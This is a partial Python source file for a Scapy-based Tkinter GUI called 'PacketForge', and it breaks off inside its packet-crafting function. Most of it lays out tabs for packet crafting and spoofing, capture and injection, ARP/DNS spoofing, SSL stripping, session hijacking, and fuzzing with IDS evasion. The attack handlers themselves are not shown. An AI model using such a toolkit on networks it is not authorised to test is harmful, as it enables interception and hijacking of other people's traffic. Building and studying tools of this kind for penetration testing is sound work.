import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import os
import sys
import json
from scapy.all import *
import netifaces

class PacketForgeGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("PacketForge - Advanced Network Packet Manipulation Tool")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Set theme and style
        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("TNotebook", background="#2E2E2E")
        self.style.configure("TNotebook.Tab", background="#3E3E3E", foreground="white", padding=[10, 5])
        self.style.map("TNotebook.Tab", background=[("selected", "#505050")])
        
        # Variables
        self.interfaces = self.get_interfaces()
        self.selected_interface = tk.StringVar(value=list(self.interfaces.keys())[0] if self.interfaces else "")
        self.protocol = tk.StringVar(value="TCP")
        self.mitm_active = False
        self.packet_capture_active = False
        self.captured_packets = []
        
        # Create main notebook
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.create_packet_crafter_tab()
        self.create_packet_capture_tab()
        self.create_mitm_tab()
        self.create_fuzzing_tab()
        self.create_scripting_tab()
        self.create_settings_tab()
        
        # Status bar
        self.status_bar = tk.Frame(root, height=25, bg="#333333")
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, padx=5, pady=5)
        
        self.status_label = tk.Label(self.status_bar, text="Ready", fg="white", bg="#333333", anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, padx=5)
        
        # Initialize logging
        self.setup_logging()
        
    def setup_logging(self):
        """Setup application logging"""
        self.log("PacketForge initialized successfully")
        
    def log(self, message, level="INFO"):
        """Log a message to the status bar and log file"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        self.status_label.config(text=message)
        print(log_message)  # For now, just print to console
    
    def get_interfaces(self):
        """Get network interfaces"""
        interfaces = {}
        try:
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    interfaces[f"{iface} ({ip})"] = iface
        except Exception as e:
            print(f"Error getting interfaces: {e}")
            # Fallback to some common interface names
            interfaces = {"eth0": "eth0", "wlan0": "wlan0", "en0": "en0"}
        return interfaces
    
    def create_packet_crafter_tab(self):
        """Create the packet crafting tab"""
        crafter_frame = ttk.Frame(self.notebook)
        self.notebook.add(crafter_frame, text="Packet Crafter")
        
        # Left panel - Configuration
        left_frame = ttk.Frame(crafter_frame, padding=10)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Protocol selection
        proto_frame = ttk.LabelFrame(left_frame, text="Protocol", padding=10)
        proto_frame.pack(fill=tk.X, pady=5)
        
        protocols = ["TCP", "UDP", "ICMP", "ARP", "DNS", "HTTP", "Raw"]
        for i, proto in enumerate(protocols):
            rb = ttk.Radiobutton(proto_frame, text=proto, value=proto, variable=self.protocol)
            rb.grid(row=0, column=i, padx=10)
        
        # Source and destination settings
        addr_frame = ttk.LabelFrame(left_frame, text="Addressing", padding=10)
        addr_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(addr_frame, text="Source IP:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.src_ip = ttk.Entry(addr_frame, width=20)
        self.src_ip.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(addr_frame, text="Source Port:").grid(row=0, column=2, sticky=tk.W, pady=5)
        self.src_port = ttk.Entry(addr_frame, width=10)
        self.src_port.grid(row=0, column=3, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(addr_frame, text="Destination IP:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.dst_ip = ttk.Entry(addr_frame, width=20)
        self.dst_ip.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(addr_frame, text="Destination Port:").grid(row=1, column=2, sticky=tk.W, pady=5)
        self.dst_port = ttk.Entry(addr_frame, width=10)
        self.dst_port.grid(row=1, column=3, sticky=tk.W, pady=5, padx=5)
        
        # TCP/IP header options
        header_frame = ttk.LabelFrame(left_frame, text="Header Options", padding=10)
        header_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(header_frame, text="TTL:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.ttl = ttk.Entry(header_frame, width=5)
        self.ttl.insert(0, "64")
        self.ttl.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(header_frame, text="Flags:").grid(row=0, column=2, sticky=tk.W, pady=5)
        self.flags = ttk.Entry(header_frame, width=10)
        self.flags.insert(0, "S")  # SYN flag by default
        self.flags.grid(row=0, column=3, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(header_frame, text="Window Size:").grid(row=0, column=4, sticky=tk.W, pady=5)
        self.window = ttk.Entry(header_frame, width=10)
        self.window.insert(0, "8192")
        self.window.grid(row=0, column=5, sticky=tk.W, pady=5, padx=5)
        
        # Packet payload
        payload_frame = ttk.LabelFrame(left_frame, text="Payload", padding=10)
        payload_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.payload_text = scrolledtext.ScrolledText(payload_frame, wrap=tk.WORD, height=10)
        self.payload_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Action buttons
        btn_frame = ttk.Frame(left_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Craft Packet", command=self.craft_packet).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Send Packet", command=self.send_packet).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save Template", command=self.save_packet_template).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Load Template", command=self.load_packet_template).pack(side=tk.LEFT, padx=5)
        
        # Right panel - Packet Preview
        right_frame = ttk.Frame(crafter_frame, padding=10)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        preview_frame = ttk.LabelFrame(right_frame, text="Packet Preview", padding=10)
        preview_frame.pack(fill=tk.BOTH, expand=True)
        
        self.packet_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD)
        self.packet_preview.pack(fill=tk.BOTH, expand=True)
        
    def create_packet_capture_tab(self):
        """Create the packet capture tab"""
        capture_frame = ttk.Frame(self.notebook)
        self.notebook.add(capture_frame, text="Packet Capture & Injection")
        
        # Top control panel
        control_frame = ttk.Frame(capture_frame, padding=10)
        control_frame.pack(fill=tk.X)
        
        # Interface selection
        ttk.Label(control_frame, text="Interface:").pack(side=tk.LEFT, padx=5)
        interface_combo = ttk.Combobox(control_frame, textvariable=self.selected_interface, 
                                      values=list(self.interfaces.keys()), width=30)
        interface_combo.pack(side=tk.LEFT, padx=5)
        
        # Filter
        ttk.Label(control_frame, text="BPF Filter:").pack(side=tk.LEFT, padx=5)
        self.capture_filter = ttk.Entry(control_frame, width=30)
        self.capture_filter.pack(side=tk.LEFT, padx=5)
        
        # Buttons
        self.capture_btn = ttk.Button(control_frame, text="Start Capture", command=self.toggle_capture)
        self.capture_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(control_frame, text="Clear", command=self.clear_capture).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Save PCAP", command=self.save_pcap).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Load PCAP", command=self.load_pcap).pack(side=tk.LEFT, padx=5)
        
        # Packet list and details
        paned_window = ttk.PanedWindow(capture_frame, orient=tk.VERTICAL)
        paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Packet list
        list_frame = ttk.Frame(paned_window)
        paned_window.add(list_frame, weight=3)
        
        columns = ('No.', 'Time', 'Source', 'Destination', 'Protocol', 'Length', 'Info')
        self.packet_tree = ttk.Treeview(list_frame, columns=columns, show='headings')
        
        for col in columns:
            self.packet_tree.heading(col, text=col)
            if col == 'Info':
                self.packet_tree.column(col, width=300)
            elif col == 'No.' or col == 'Length':
                self.packet_tree.column(col, width=70, anchor=tk.E)
            elif col == 'Time':
                self.packet_tree.column(col, width=120)
            else:
                self.packet_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.packet_tree.yview)
        self.packet_tree.configure(yscroll=scrollbar.set)
        
        self.packet_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.packet_tree.bind('<<TreeviewSelect>>', self.display_packet_details)
        
        # Packet details and hex view
        details_frame = ttk.Frame(paned_window)
        paned_window.add(details_frame, weight=2)
        
        details_notebook = ttk.Notebook(details_frame)
        details_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Details tab
        packet_details_frame = ttk.Frame(details_notebook)
        details_notebook.add(packet_details_frame, text="Details")
        
        self.packet_details = scrolledtext.ScrolledText(packet_details_frame, wrap=tk.WORD)
        self.packet_details.pack(fill=tk.BOTH, expand=True)
        
        # Hex view tab
        hex_frame = ttk.Frame(details_notebook)
        details_notebook.add(hex_frame, text="Hex View")
        
        self.packet_hex = scrolledtext.ScrolledText(hex_frame, wrap=tk.WORD, font=('Courier', 10))
        self.packet_hex.pack(fill=tk.BOTH, expand=True)
        
        # Injection panel at bottom
        injection_frame = ttk.LabelFrame(capture_frame, text="Packet Injection", padding=10)
        injection_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(injection_frame, text="Replay Selected", command=self.replay_packet).pack(side=tk.LEFT, padx=5)
        ttk.Button(injection_frame, text="Modify & Inject", command=self.modify_and_inject).pack(side=tk.LEFT, padx=5)
        ttk.Button(injection_frame, text="TCP Session Hijack", command=self.hijack_session).pack(side=tk.LEFT, padx=5)
        
    def create_mitm_tab(self):
        """Create the Man-in-the-Middle tab"""
        mitm_frame = ttk.Frame(self.notebook)
        self.notebook.add(mitm_frame, text="Man-in-the-Middle")
        
        # Configuration panel
        config_frame = ttk.LabelFrame(mitm_frame, text="MitM Configuration", padding=10)
        config_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Interface selection
        ttk.Label(config_frame, text="Interface:").grid(row=0, column=0, sticky=tk.W, pady=5)
        interface_combo = ttk.Combobox(config_frame, textvariable=self.selected_interface, 
                                      values=list(self.interfaces.keys()), width=30)
        interface_combo.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        # Target settings
        ttk.Label(config_frame, text="Target 1 IP:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.target1_ip = ttk.Entry(config_frame, width=20)
        self.target1_ip.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(config_frame, text="Target 2 IP:").grid(row=1, column=2, sticky=tk.W, pady=5)
        self.target2_ip = ttk.Entry(config_frame, width=20)
        self.target2_ip.grid(row=1, column=3, sticky=tk.W, pady=5, padx=5)
        
        # Attack methods
        attack_frame = ttk.LabelFrame(mitm_frame, text="Attack Methods", padding=10)
        attack_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.use_arp_spoofing = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_frame, text="ARP Spoofing", variable=self.use_arp_spoofing).grid(row=0, column=0, padx=10)
        
        self.use_dns_spoofing = tk.BooleanVar(value=False)
        ttk.Checkbutton(attack_frame, text="DNS Spoofing", variable=self.use_dns_spoofing).grid(row=0, column=1, padx=10)
        
        self.use_ssl_strip = tk.BooleanVar(value=False)
        ttk.Checkbutton(attack_frame, text="SSL Strip", variable=self.use_ssl_strip).grid(row=0, column=2, padx=10)
        
        self.use_session_hijacking = tk.BooleanVar(value=False)
        ttk.Checkbutton(attack_frame, text="Session Hijacking", variable=self.use_session_hijacking).grid(row=0, column=3, padx=10)
        
        # DNS spoofing settings (only shown when DNS spoofing is enabled)
        self.dns_frame = ttk.LabelFrame(mitm_frame, text="DNS Spoofing Settings", padding=10)
        self.dns_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(self.dns_frame, text="Domain:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.spoof_domain = ttk.Entry(self.dns_frame, width=30)
        self.spoof_domain.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(self.dns_frame, text="Redirect to IP:").grid(row=0, column=2, sticky=tk.W, pady=5)
        self.spoof_ip = ttk.Entry(self.dns_frame, width=20)
        self.spoof_ip.grid(row=0, column=3, sticky=tk.W, pady=5, padx=5)
        
        ttk.Button(self.dns_frame, text="Add Rule", command=self.add_dns_rule).grid(row=0, column=4, padx=5)
        
        # DNS rule list
        self.dns_rules = ttk.Treeview(self.dns_frame, columns=('Domain', 'Redirect IP'), show='headings', height=5)
        self.dns_rules.heading('Domain', text='Domain')
        self.dns_rules.heading('Redirect IP', text='Redirect IP')
        self.dns_rules.column('Domain', width=250)
        self.dns_rules.column('Redirect IP', width=150)
        self.dns_rules.grid(row=1, column=0, columnspan=5, sticky=tk.EW, pady=5)
        
        # Control buttons
        btn_frame = ttk.Frame(mitm_frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.mitm_btn = ttk.Button(btn_frame, text="Start MitM Attack", command=self.toggle_mitm)
        self.mitm_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Clear Logs", command=self.clear_mitm_logs).pack(side=tk.LEFT, padx=5)
        
        # Traffic display
        traffic_frame = ttk.LabelFrame(mitm_frame, text="Intercepted Traffic", padding=10)
        traffic_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        paned_window = ttk.PanedWindow(traffic_frame, orient=tk.VERTICAL)
        paned_window.pack(fill=tk.BOTH, expand=True)
        
        # Traffic list
        list_frame = ttk.Frame(paned_window)
        paned_window.add(list_frame, weight=2)
        
        columns = ('Time', 'Source', 'Destination', 'Protocol', 'Length', 'Info')
        self.traffic_tree = ttk.Treeview(list_frame, columns=columns, show='headings')
        
        for col in columns:
            self.traffic_tree.heading(col, text=col)
            if col == 'Info':
                self.traffic_tree.column(col, width=300)
            elif col == 'Length':
                self.traffic_tree.column(col, width=70, anchor=tk.E)
            elif col == 'Time':
                self.traffic_tree.column(col, width=120)
            else:
                self.traffic_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.traffic_tree.yview)
        self.traffic_tree.configure(yscroll=scrollbar.set)
        
        self.traffic_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Modification panel
        mod_frame = ttk.Frame(paned_window)
        paned_window.add(mod_frame, weight=1)
        
        ttk.Label(mod_frame, text="Packet Modification Rules:").pack(anchor=tk.W, pady=5)
        
        rule_frame = ttk.Frame(mod_frame)
        rule_frame.pack(fill=tk.X)
        
        ttk.Label(rule_frame, text="Match Pattern:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.match_pattern = ttk.Entry(rule_frame, width=30)
        self.match_pattern.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(rule_frame, text="Replace With:").grid(row=0, column=2, sticky=tk.W, pady=5)
        self.replace_pattern = ttk.Entry(rule_frame, width=30)
        self.replace_pattern.grid(row=0, column=3, sticky=tk.W, pady=5, padx=5)
        
        ttk.Button(rule_frame, text="Add Rule", command=self.add_modification_rule).grid(row=0, column=4, padx=5)
        
        # Rules list
        self.modification_rules = ttk.Treeview(mod_frame, columns=('Match', 'Replace'), show='headings', height=5)
        self.modification_rules.heading('Match', text='Match Pattern')
        self.modification_rules.heading('Replace', text='Replace With')
        self.modification_rules.column('Match', width=300)
        self.modification_rules.column('Replace', width=300)
        self.modification_rules.pack(fill=tk.X, pady=5)
        
    def create_fuzzing_tab(self):
        """Create the fuzzing tab"""
        fuzzing_frame = ttk.Frame(self.notebook)
        self.notebook.add(fuzzing_frame, text="Deep Inspection & Fuzzing")
        
        # Target configuration
        target_frame = ttk.LabelFrame(fuzzing_frame, text="Target Configuration", padding=10)
        target_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(target_frame, text="Target IP:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.fuzz_target_ip = ttk.Entry(target_frame, width=20)
        self.fuzz_target_ip.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(target_frame, text="Target Port:").grid(row=0, column=2, sticky=tk.W, pady=5)
        self.fuzz_target_port = ttk.Entry(target_frame, width=10)
        self.fuzz_target_port.grid(row=0, column=3, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(target_frame, text="Protocol:").grid(row=0, column=4, sticky=tk.W, pady=5)
        self.fuzz_protocol = ttk.Combobox(target_frame, values=["TCP", "UDP", "HTTP", "DNS", "ICMP"], width=10)
        self.fuzz_protocol.current(0)
        self.fuzz_protocol.grid(row=0, column=5, sticky=tk.W, pady=5, padx=5)
        
        # Fuzzing options
        options_frame = ttk.LabelFrame(fuzzing_frame, text="Fuzzing Options", padding=10)
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(options_frame, text="Fuzzing Type:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.fuzz_type = ttk.Combobox(options_frame, values=[
            "Header Field Mutation", 
            "Payload Mutation", 
            "Size Mutation", 
            "Protocol Compliance", 
            "Boundary Testing",
            "Random Fuzzing"
        ], width=20)
        self.fuzz_type.current(0)
        self.fuzz_type.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(options_frame, text="Mutation Rate (%):").grid(row=0, column=2, sticky=tk.W, pady=5)
        self.mutation_rate = ttk.Scale(options_frame, from_=1, to=100, orient=tk.HORIZONTAL, length=150)
        self.mutation_rate.set(20)
        self.mutation_rate.grid(row=0, column=3, sticky=tk.W, pady=5, padx=5)
        
        self.mutation_value = ttk.Label(options_frame, text="20%")
        self.mutation_value.grid(row=0, column=4, sticky=tk.W, pady=5)
        
        # Update mutation value label when slider changes
        self.mutation_rate.configure(command=lambda v: self.mutation_value.configure(text=f"{int(float(v))}%"))
        
        ttk.Label(options_frame, text="Number of Packets:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.num_packets = ttk.Entry(options_frame, width=10)
        self.num_packets.insert(0, "100")
        self.num_packets.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(options_frame, text="Delay (ms):").grid(row=1, column=2, sticky=tk.W, pady=5)
        self.packet_delay = ttk.Entry(options_frame, width=10)
        self.packet_delay.insert(0, "10")
        self.packet_delay.grid(row=1, column=3, sticky=tk.W, pady=5, padx=5)
        
        # Advanced options
        advanced_frame = ttk.LabelFrame(fuzzing_frame, text="Advanced Options", padding=10)
        advanced_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.evade_ids = tk.BooleanVar(value=False)
        ttk.Checkbutton(advanced_frame, text="Use IDS/IPS Evasion Techniques", variable=self.evade_ids).grid(row=0, column=0, sticky=tk.W, padx=5)
        
        self.fragment_packets = tk.BooleanVar(value=False)
        ttk.Checkbutton(advanced_frame, text="Fragment Packets", variable=self.fragment_packets).grid(row=0, column=1, sticky=tk.W, padx=5)
        
        self.randomize_fields = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="Randomize Fields", variable=self.randomize_fields).grid(row=0, column=2, sticky=tk.W, padx=5)
        
        self.test_boundaries = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="Test Boundary Conditions", variable=self.test_boundaries).grid(row=0, column=3, sticky=tk.W, padx=5)
        
        # Control buttons
        control_frame = ttk.Frame(fuzzing_frame)
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.fuzzing_btn = ttk.Button(control_frame, text="Start Fuzzing", command=self.start_fuzzing)
        self.fuzzing_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(control_frame, text="Save Configuration", command=self.save_fuzzing_config).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Load Configuration", command=self.load_fuzzing_config).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Clear Results", command=self.clear_fuzzing_results).pack(side=tk.LEFT, padx=5)
        
        # Results panel
        results_frame = ttk.LabelFrame(fuzzing_frame, text="Fuzzing Results", padding=10)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Results notebook
        results_notebook = ttk.Notebook(results_frame)
        results_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Log tab
        log_frame = ttk.Frame(results_notebook)
        results_notebook.add(log_frame, text="Log")
        
        self.fuzzing_log = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD)
        self.fuzzing_log.pack(fill=tk.BOTH, expand=True)
        
        # Results tab
        summary_frame = ttk.Frame(results_notebook)
        results_notebook.add(summary_frame, text="Summary")
        
        self.fuzzing_summary = scrolledtext.ScrolledText(summary_frame, wrap=tk.WORD)
        self.fuzzing_summary.pack(fill=tk.BOTH, expand=True)
        
# Anomalies tab
        anomalies_frame = ttk.Frame(results_notebook)
        results_notebook.add(anomalies_frame, text="Anomalies")
        
        columns = ('ID', 'Time', 'Type', 'Description', 'Severity')
        self.anomalies_tree = ttk.Treeview(anomalies_frame, columns=columns, show='headings')
        
        for col in columns:
            self.anomalies_tree.heading(col, text=col)
            if col == 'Description':
                self.anomalies_tree.column(col, width=400)
            elif col == 'ID':
                self.anomalies_tree.column(col, width=50, anchor=tk.E)
            elif col == 'Time':
                self.anomalies_tree.column(col, width=150)
            else:
                self.anomalies_tree.column(col, width=100)
        
        scrollbar = ttk.Scrollbar(anomalies_frame, orient=tk.VERTICAL, command=self.anomalies_tree.yview)
        self.anomalies_tree.configure(yscroll=scrollbar.set)
        
        self.anomalies_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
    def create_scripting_tab(self):
        """Create the scripting tab"""
        scripting_frame = ttk.Frame(self.notebook)
        self.notebook.add(scripting_frame, text="Scripting & Automation")
        
        # Left panel - Script editor
        editor_frame = ttk.LabelFrame(scripting_frame, text="Script Editor", padding=10)
        editor_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Editor toolbar
        toolbar = ttk.Frame(editor_frame)
        toolbar.pack(fill=tk.X, pady=5)
        
        self.script_language = ttk.Combobox(toolbar, values=["Python (Scapy)", "C (Raw Sockets)", "Shell Script"])
        self.script_language.current(0)
        self.script_language.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(toolbar, text="New", command=self.new_script).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="Open", command=self.open_script).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="Save", command=self.save_script).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="Run", command=self.run_script).pack(side=tk.LEFT, padx=5)
        
        # Editor
        self.code_editor = scrolledtext.ScrolledText(editor_frame, wrap=tk.NONE, font=('Courier', 10))
        self.code_editor.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Insert default template
        self.insert_script_template()
        
        # Right panel - Console output and templates
        right_panel = ttk.Frame(scripting_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Console output
        console_frame = ttk.LabelFrame(right_panel, text="Console Output", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.console_output = scrolledtext.ScrolledText(console_frame, wrap=tk.WORD, bg="#000000", fg="#00FF00")
        self.console_output.pack(fill=tk.BOTH, expand=True)
        
        # Templates
        templates_frame = ttk.LabelFrame(right_panel, text="Script Templates", padding=10)
        templates_frame.pack(fill=tk.X, pady=5)
        
        templates = ["TCP SYN Scan", "ARP Spoofer", "DNS Hijacker", "Packet Sniffer", "HTTP Traffic Modifier"]
        
        for template in templates:
            ttk.Button(templates_frame, text=template, 
                      command=lambda t=template: self.load_template(t)).pack(anchor=tk.W, padx=5, pady=2)
    
    def create_settings_tab(self):
        """Create the settings tab"""
        settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(settings_frame, text="Settings")
        
        # Network settings
        network_frame = ttk.LabelFrame(settings_frame, text="Network Settings", padding=10)
        network_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(network_frame, text="Default Interface:").grid(row=0, column=0, sticky=tk.W, pady=5)
        interface_combo = ttk.Combobox(network_frame, textvariable=self.selected_interface, 
                                      values=list(self.interfaces.keys()), width=30)
        interface_combo.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(network_frame, text="Capture Buffer Size (MB):").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.buffer_size = ttk.Entry(network_frame, width=10)
        self.buffer_size.insert(0, "100")
        self.buffer_size.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(network_frame, text="Promiscuous Mode:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.promiscuous_mode = tk.BooleanVar(value=True)
        ttk.Checkbutton(network_frame, variable=self.promiscuous_mode).grid(row=2, column=1, sticky=tk.W, pady=5, padx=5)
        
        # Application settings
        app_frame = ttk.LabelFrame(settings_frame, text="Application Settings", padding=10)
        app_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(app_frame, text="Theme:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.app_theme = ttk.Combobox(app_frame, values=["Dark", "Light", "System"], width=10)
        self.app_theme.current(0)
        self.app_theme.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(app_frame, text="Font Size:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.font_size = ttk.Combobox(app_frame, values=["8", "9", "10", "11", "12", "14"], width=5)
        self.font_size.current(3)
        self.font_size.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(app_frame, text="Save Session on Exit:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.save_session = tk.BooleanVar(value=True)
        ttk.Checkbutton(app_frame, variable=self.save_session).grid(row=2, column=1, sticky=tk.W, pady=5, padx=5)
        
        # Security settings
        security_frame = ttk.LabelFrame(settings_frame, text="Security Settings", padding=10)
        security_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(security_frame, text="Encryption:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.use_encryption = tk.BooleanVar(value=True)
        ttk.Checkbutton(security_frame, variable=self.use_encryption).grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(security_frame, text="Log Level:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.log_level = ttk.Combobox(security_frame, values=["DEBUG", "INFO", "WARNING", "ERROR"], width=10)
        self.log_level.current(1)
        self.log_level.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        
        # Control buttons
        btn_frame = ttk.Frame(settings_frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=20)
        
        ttk.Button(btn_frame, text="Save Settings", command=self.save_settings).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Load Settings", command=self.load_settings).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Reset to Default", command=self.reset_settings).pack(side=tk.LEFT, padx=5)
        
        # About section
        about_frame = ttk.LabelFrame(settings_frame, text="About", padding=10)
        about_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        about_text = """PacketForge - Advanced Network Packet Manipulation Tool
        
Version: 1.0.0
        
A comprehensive tool for network security professionals, penetration testers, and network administrators.
        
Features:
- Custom packet crafting with support for multiple protocols
- Real-time packet capture and analysis
- Man-in-the-Middle attack simulation
- Deep packet inspection and protocol fuzzing
- Scripting and automation capabilities
- Cross-platform support (Windows, Linux, MacOS)
        
This software should be used for legal network testing and educational purposes only.
Unauthorized network scanning or attacks may violate local laws.
        
Copyright © 2025. All rights reserved."""
        
        about_label = ttk.Label(about_frame, text=about_text, justify=tk.LEFT, wraplength=600)
        about_label.pack(padx=10, pady=10)
        
    # ====== Packet Crafter Methods ======
    def craft_packet(self):
        """Craft a packet based on user inputs"""
        try:
            protocol = self.protocol.get()
            src_ip = self.src_ip.get() or "127.0.0.1"
            dst_ip = self.dst_ip.get() or "127.0.0.1"
            
            # Create the base packet based on protocol
            if protocol == "TCP":
                src_port = int(self.src_port.get() or "12345")
                dst_port = int(self.dst_port.get() or "80")
                flags = self.flags.get() or "S"
                window = int(self.window.get() or "8192")
                ttl = int(self.ttl.get() or "64")
                
                # Create the packet
                packet = IP(src=src_ip, dst=dst_ip, ttl=ttl)/TCP(
                    sport=src_port, dport=dst_port, flags=flags, window=window
                )
                
                # Add payload if provided
                payload = self.payload_text.get("1.0", tk.END).strip()
                if payload:
                    packet = packet/payload
                
            elif protocol == "UDP":
                src_port = int(self.src_port.get() or "12345")
                dst_port = int(self.dst_port.get() or "53")
                ttl = int(self.ttl.get() or "64")
                
                # Create the packet
                packet = IP(src=src_ip, dst=dst_ip, ttl=ttl)/UDP(
                    sport=src_port, dport=dst_port
                )
                
                # Add payload if provided
                payload = self.payload_text.get("1.0", tk.END).strip()
                if payload:
                    packet = packet/payload
                    
            elif protocol == "ICMP":
                icmp_type = 8  # Echo request
                ttl = int(self.ttl.get() or "64")
                
                # Create the packet
                packet = IP(src=src_ip, dst=dst_ip, ttl=ttl)/ICMP(type=icmp_type)
                
                # Add payload if provided
                payload = self.payload_text.get("1.0", tk.END).strip()
                if payload:
                    packet = packet/payload
                    
            elif protocol == "ARP":
                # Create the packet
                packet = ARP(pdst=dst_ip, psrc=src_ip)
                
            elif protocol == "DNS":
                src_port = int(self.src_port.get() or "12345")
                dst_port = int(self.dst_port.get() or "53")
                
                # Extract domain from payload
